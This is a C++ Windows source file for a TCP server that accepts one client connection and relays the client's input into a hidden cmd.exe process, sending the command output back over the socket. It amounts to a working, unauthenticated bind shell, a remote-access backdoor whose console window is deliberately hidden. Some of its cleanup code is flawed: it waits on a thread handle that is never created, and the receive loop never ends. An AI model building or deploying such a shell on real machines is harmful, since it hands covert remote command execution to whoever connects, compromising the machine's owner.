#include "pch.h"
#undef UNICODE

#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include "Server.h"

// Need to link with Ws2_32.lib
#pragma comment (lib, "Ws2_32.lib")
// #pragma comment (lib, "Mswsock.lib")

LPSTR cmdpath = LPSTR("C:\\Windows\\System32\\cmd.exe");

HANDLE hChildProcess = NULL;
HANDLE hStdIn = NULL; // Handle to parents std input.
BOOL bRunThread = TRUE;



/////////////////////////////////////////////////////////////////////// 
// DisplayError
// Displays the error number and corresponding message.
///////////////////////////////////////////////////////////////////////
void DisplayError(const char *pszAPI)
{
	LPVOID lpvMessageBuffer;
	CHAR szPrintBuffer[512];
	DWORD nCharsWritten;

	FormatMessage(
		FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
		NULL, GetLastError(),
		MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
		(LPTSTR)&lpvMessageBuffer, 0, NULL);

	wsprintf(szPrintBuffer,
		"ERROR: API    = %s.\n   error code = %d.\n   message    = %s.\n",
		pszAPI, GetLastError(), (char *)lpvMessageBuffer);

	WriteConsole(GetStdHandle(STD_OUTPUT_HANDLE), szPrintBuffer,
		lstrlen(szPrintBuffer), &nCharsWritten, NULL);

	LocalFree(lpvMessageBuffer);
}



/////////////////////////////////////////////////////////////////////// 
// PrepAndLaunchRedirectedChild
// Sets up STARTUPINFO structure, and launches redirected child.
/////////////////////////////////////////////////////////////////////// 
void PrepAndLaunchRedirectedChild(HANDLE hChildStdOut, HANDLE hChildStdIn, HANDLE hChildStdErr)
{
	PROCESS_INFORMATION pi;
	STARTUPINFO si;

	// Set up the start up info struct.
	ZeroMemory(&si, sizeof(STARTUPINFO));
	si.cb = sizeof(STARTUPINFO);
	si.dwFlags = STARTF_USESTDHANDLES| STARTF_USESHOWWINDOW;
	si.hStdOutput = hChildStdOut;
	si.hStdInput = hChildStdIn;
	si.hStdError = hChildStdErr;
	si.wShowWindow = SW_HIDE;
	// Use this if you want to hide the child:
	//     si.wShowWindow = SW_HIDE;
	// Note that dwFlags must include STARTF_USESHOWWINDOW if you want to
	// use the wShowWindow flags.


	// Launch the process that you want to redirect (in this case,
	// Child.exe). Make sure Child.exe is in the same directory as
	// redirect.c launch redirect from a command line to prevent location
	// confusion.
	if (!CreateProcess(NULL, cmdpath, NULL, NULL, TRUE,
		CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
		DisplayError("CreateProcess");


	// Set global child process handle to cause threads to exit.
	hChildProcess = pi.hProcess;


	// Close any unnecessary handles.
	if (!CloseHandle(pi.hThread)) DisplayError("CloseHandle");
}


/////////////////////////////////////////////////////////////////////// 
// ReadAndHandleOutput
// Monitors handle for input. Exits when child exits or pipe breaks.
/////////////////////////////////////////////////////////////////////// 
DWORD WINAPI ReadAndHandleOutput(LPVOID lpvThreadParam)
{
	CHAR lpBuffer[DEFAULT_BUFLEN];
	DWORD nBytesRead;
	DWORD nCharsWritten;
	HANDLE hPipeRead = (HANDLE)lpvThreadParam;
	int iSendResult;

	while (TRUE) {

		if (!ReadFile(hPipeRead, lpBuffer, sizeof(lpBuffer),
			&nBytesRead, NULL) || !nBytesRead)
		{
			if (GetLastError() == ERROR_BROKEN_PIPE)
				break; // pipe done - normal exit path.
			else
				DisplayError("ReadFile"); // Something bad happened.
		}

		if (nBytesRead) {
			printf("%.*s", nBytesRead, lpBuffer);
			nBytesRead = 0;
			fflush(stdout);
		}
	}

	return 1;
}

/////////////////////////////////////////////////////////////////////// 
// GetAndSendInputThread
// Thread procedure that monitors the console for input and sends input
// to the child process through the input pipe.
// This thread ends when the child application exits.
/////////////////////////////////////////////////////////////////////// 
DWORD WINAPI GetAndSendInputThread(LPVOID lpvThreadParam)
{
	CHAR read_buff[DEFAULT_BUFLEN];
	DWORD nBytesRead, nBytesWrote;
	HANDLE hPipeWrite = (HANDLE)lpvThreadParam;

	// Get input from our console and send it to child through the pipe.
	while (bRunThread)
	{
		if (!ReadFile(hStdIn, read_buff, 1, &nBytesRead, NULL))
			DisplayError("ReadStdin");

		//read_buff[nBytesRead] = '\0'; // Follow input with a NULL.

		if (!WriteFile(hPipeWrite, read_buff, nBytesRead, &nBytesWrote, NULL))
		{
			if (GetLastError() == ERROR_NO_DATA)
				break; // Pipe was closed (normal exit path).
			else
				DisplayError("WriteFile");
		}
	}

	return 1;
}


Server::Server() {
	ListenSocket = INVALID_SOCKET;
	ClientSocket = INVALID_SOCKET;
	result = NULL;
	recvbuflen = DEFAULT_BUFLEN;
}
int Server::set_up_socket() {
	// Initialize Winsock
	iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (iResult != 0) {
		printf("WSAStartup failed with error: %d\n", iResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;
	hints.ai_flags = AI_PASSIVE;

	// Resolve the server address and port
	iResult = getaddrinfo(NULL, DEFAULT_PORT, &hints, &result);
	if (iResult != 0) {
		printf("getaddrinfo failed with error: %d\n", iResult);
		WSACleanup();
		return 1;
	}

	// Create a SOCKET for connecting to server
	ListenSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
	if (ListenSocket == INVALID_SOCKET) {
		printf("socket failed with error: %ld\n", WSAGetLastError());
		freeaddrinfo(result);
		WSACleanup();
		return 1;
	}

	// Setup the TCP listening socket
	iResult = bind(ListenSocket, result->ai_addr, (int)result->ai_addrlen);
	if (iResult == SOCKET_ERROR) {
		printf("bind failed with error: %d\n", WSAGetLastError());
		freeaddrinfo(result);
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	freeaddrinfo(result);
	return 0;
}
int Server::listen_socket() {
	iResult = listen(ListenSocket, SOMAXCONN);
	if (iResult == SOCKET_ERROR) {
		printf("listen failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}
	return 0;
}
int Server::accept_client_socket() {
	// Accept a client socket
	ClientSocket = accept(ListenSocket, NULL, NULL);
	if (ClientSocket == INVALID_SOCKET) {
		printf("accept failed with error: %d\n", WSAGetLastError());
		closesocket(ListenSocket);
		WSACleanup();
		return 1;
	}

	// No longer need server socket
	closesocket(ListenSocket);
	return 0;
}
int Server::recv_data() {
	char* cmdargs = (char*)malloc(size_t(DEFAULT_BUFLEN));
	ZeroMemory(cmdargs, DEFAULT_BUFLEN);


	// START OF CREATING REDIRECTED CMD
	HANDLE hOutputReadTmp, hOutputRead, hOutputWrite;
	HANDLE hInputWriteTmp, hInputRead, hInputWrite;
	HANDLE hErrorWrite;
	HANDLE hThread, lThread;
	DWORD ThreadId1, ThreadId2;
	SECURITY_ATTRIBUTES sa;

	// Set up the security attributes struct.
	sa.nLength = sizeof(SECURITY_ATTRIBUTES);
	sa.lpSecurityDescriptor = NULL;
	sa.bInheritHandle = TRUE;


	// Create the child output pipe.
	if (!CreatePipe(&hOutputReadTmp, &hOutputWrite, &sa, 0))
		DisplayError("CreatePipe");


	// Create a duplicate of the output write handle for the std error
	// write handle. This is necessary in case the child application
	// closes one of its std output handles.
	if (!DuplicateHandle(GetCurrentProcess(), hOutputWrite,
		GetCurrentProcess(), &hErrorWrite, 0,
		TRUE, DUPLICATE_SAME_ACCESS))
		DisplayError("DuplicateHandle");


	// Create the child input pipe.
	if (!CreatePipe(&hInputRead, &hInputWriteTmp, &sa, 0))
		DisplayError("CreatePipe");


	// Create new output read handle and the input write handles. Set
	// the Properties to FALSE. Otherwise, the child inherits the
	// properties and, as a result, non-closeable handles to the pipes
	// are created.
	if (!DuplicateHandle(GetCurrentProcess(), hOutputReadTmp,
		GetCurrentProcess(),
		&hOutputRead, // Address of new handle.
		0, FALSE, // Make it uninheritable.
		DUPLICATE_SAME_ACCESS))
		DisplayError("DuplicateHandle");

	if (!DuplicateHandle(GetCurrentProcess(), hInputWriteTmp,
		GetCurrentProcess(),
		&hInputWrite, // Address of new handle.
		0, FALSE, // Make it uninheritable.
		DUPLICATE_SAME_ACCESS))
		DisplayError("DuplicateHandle");


	// Close inheritable copies of the handles you do not want to be
	// inherited.
	if (!CloseHandle(hOutputReadTmp)) DisplayError("CloseHandle");
	if (!CloseHandle(hInputWriteTmp)) DisplayError("CloseHandle");


	// Get std input handle so you can close it and force the ReadFile to
	// fail when you want the input thread to exit.
	if ((hStdIn = GetStdHandle(STD_INPUT_HANDLE)) ==
		INVALID_HANDLE_VALUE)
		DisplayError("GetStdHandle");

	PrepAndLaunchRedirectedChild(hOutputWrite, hInputRead, hErrorWrite);


	// Close pipe handles (do not continue to modify the parent).
	// You need to make sure that no handles to the write end of the
	// output pipe are maintained in this process or else the pipe will
	// not close when the child process exits and the ReadFile will hang.
	if (!CloseHandle(hOutputWrite)) DisplayError("CloseHandle");
	if (!CloseHandle(hInputRead)) DisplayError("CloseHandle");
	if (!CloseHandle(hErrorWrite)) DisplayError("CloseHandle");


	// Launch the thread that gets the input and sends it to the child.
	hThread = CreateThread(NULL, 0, GetAndSendInputThread, (LPVOID)hInputWrite, 0, &ThreadId1);
	if (hThread == NULL) DisplayError("CreateThread");


	//// Read the child's output.
	//lThread = CreateThread(NULL, 0, ReadAndHandleOutput, (LPVOID)hOutputRead, 0, &ThreadId2);
	//if (lThread == NULL) DisplayError("CreateThread");
	// Redirection is complete

	// TODO: READ FROM CLIENT AND WRITE TO CMD
	Package data, pack;
	char lpBuffer[DEFAULT_BUFLEN];
	DWORD nBytesWrote, nBytesRead;

	while (true)
	{
		iResult = recv(ClientSocket, (char*)&data, sizeof(Package), 0);
		if (iResult > 0) {
			
			if (!WriteFile(hInputWrite, data.str, data.len, &nBytesWrote, NULL))
			{
				DisplayError("WriteFile");
			}

			if (!ReadFile(hOutputRead, lpBuffer, sizeof(lpBuffer),
				&nBytesRead, NULL) || !nBytesRead)
			{
				DisplayError("ReadFile"); // Something bad happened.
			}

			memcpy(pack.str, lpBuffer, DEFAULT_BUFLEN);
			pack.len = nBytesRead;

			// Send CMD output back to client
			iSendResult = send(ClientSocket, (char*)&pack, sizeof(Package), 0);
			if (iSendResult == SOCKET_ERROR) {
				printf("send failed: %d\n", WSAGetLastError());
				closesocket(ClientSocket);
				WSACleanup();
				return 1;
			}
		}
		else if (iResult == 0)
			printf("Connection closing...\n");
		else {
			printf("recv failed with error: %d\n", WSAGetLastError());
			closesocket(ClientSocket);
			WSACleanup();
			return 1;
		}
		
	}
	
	// Force the read on the input to return by closing the stdin handle.
	if (!CloseHandle(hStdIn)) DisplayError("CloseHandle");

	// Tell the thread to exit and wait for thread to die.
	bRunThread = FALSE;

	if (WaitForSingleObject(hThread, INFINITE) == WAIT_FAILED)
		DisplayError("WaitForSingleObject");
	if (WaitForSingleObject(lThread, INFINITE) == WAIT_FAILED)
		DisplayError("WaitForSingleObject");

	if (!CloseHandle(hOutputRead)) DisplayError("CloseHandle");
	if (!CloseHandle(hInputWrite)) DisplayError("CloseHandle");
	
	// shutdown the connection since we're done
	iResult = shutdown(ClientSocket, SD_SEND);
	if (iResult == SOCKET_ERROR) {
		printf("shutdown failed with error: %d\n", WSAGetLastError());
		closesocket(ClientSocket);
		WSACleanup();
		return 1;
	}

	return 0;
}
int Server::close_connection() {
	// cleanup
	closesocket(ClientSocket);
	WSACleanup();
	return 0;
}
